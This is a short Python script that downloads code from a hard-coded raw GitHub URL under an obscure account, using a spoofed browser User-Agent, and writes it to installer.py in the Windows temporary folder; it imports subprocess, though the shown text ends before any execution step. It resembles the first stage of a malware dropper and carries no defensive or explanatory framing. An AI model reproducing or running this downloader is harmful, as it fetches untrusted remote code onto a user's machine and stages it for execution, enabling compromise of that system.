import os
import random
import urllib.request
import subprocess
import shutil

global installer_url

installer_url = 'https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/fetch'

def fetch_python_code(installer_url):
    try:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        headers = {'User-Agent': user_agent}
        req = urllib.request.Request(installer_url, headers=headers)
        with urllib.request.urlopen(req) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f"Error fetching code from {installer_url}: {e}")
        return None

def write_python_file(installer_url):
    try:
        code = fetch_python_code(installer_url)
        if code:
            temp_dir = os.getenv('TEMP')
            py_file_path = os.path.join(temp_dir, "installer.py")
            with open(py_file_path, 'w', encoding='utf-8') as f:
                f.write(code)
            return py_file_path
        else:
            print("Error: No code to write for installer.")
            return None
    except Exception as e:
        print(f"Error writing installer file: {e}")
        return None
